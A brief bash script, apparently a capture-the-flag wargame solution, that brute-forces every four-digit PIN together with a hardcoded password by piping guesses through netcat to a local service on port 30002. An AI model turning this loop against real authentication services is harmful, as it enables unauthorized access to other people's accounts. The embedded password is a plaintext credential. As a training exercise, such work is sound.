#! /bin/bash
password=VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
for i in {0000..9999}; do
        echo "$password $i"
done | nc localhost 30002
~                            
